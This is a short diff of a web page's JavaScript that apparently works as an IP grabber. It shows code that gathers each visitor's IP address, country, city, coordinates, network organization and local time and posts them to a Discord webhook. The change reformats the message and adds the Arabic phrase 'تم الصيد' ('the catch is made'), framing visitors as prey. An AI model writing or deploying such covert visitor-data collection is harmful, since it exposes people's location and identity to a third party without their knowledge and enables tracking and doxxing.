@@ -90,18 +90,20 @@
         document.getElementById('org').textContent = data.org;
         document.getElementById('timezone').textContent = data.timezone;
 
-        // Prepare local time string in visitor's timezone
         const now = new Date().toLocaleString('en-US', { timeZone: data.timezone });
 
-        // Send data to Discord webhook
         const payload = {
-          content: `📥 New visit detected:
+          content: `------------------------
+------------------------
 🧠 IP: ${data.ip}
 🌍 Country: ${data.country}
 🏙️ City: ${data.city}
 📍 Location: ${data.loc}
 🏢 Organization: ${data.org}
-⏰ Local Time: ${now}`
+⏰ Local Time: ${now}
+------------------------
+------------------------
+تم الصيد`
         };
 
         fetch(webhookURL, {
